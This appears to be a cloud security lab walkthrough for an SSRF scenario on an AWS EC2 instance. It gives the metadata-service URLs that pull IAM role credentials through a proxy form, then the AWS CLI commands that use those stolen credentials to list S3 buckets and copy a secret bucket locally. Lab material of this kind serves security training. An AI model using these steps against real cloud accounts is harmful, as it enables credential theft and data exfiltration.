# SSRF
In this scenario you will abuse a http proxy running on an EC2 instance to get its IAM Role credentials. With the credentials in place, you discover it has too much permissions.
SSRF on EC2 is a dangerous vulnerability, especially since most AWS accounts have over-permissive IAM roles assigned to their instances. Attackers can exploit this to get their hands on valuable data.

## Attack procedure
<details><summary>The steps to take</summary>

1. Connect to the given EC2 public ip address or DNS name given in the Terraform output.
2. Enter the following url in the proxy form `http://169.254.169.254/latest/meta-data/iam/security-credentials`. 
The result wil give an IAM Instance Role name, remember this name.
3. Now input the url `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role name]`. As a result, the AWS AccessKeyID, SecretAccessKey and Token are given.
4. Setup a local AWS CLI profile using these credentials and token.
e.g add the following to `~/.aws/credentials`. 

        [stolen-creds]
        aws_access_key_id = [The AccesKeyID]
        aws_secret_access_key = [The SecretAccessKey]
        aws_session_token = [The Token]

5. List all available bucket `aws s3 ls --profile stolen-creds` and discover a secret bucket.
6. List the content of the secret bucket and copy it to your local machine
`aws s3 sync s3://[name of secret bucket]/ . --profile stolen-creds`.
7. Done, secrets stolen.
</details>
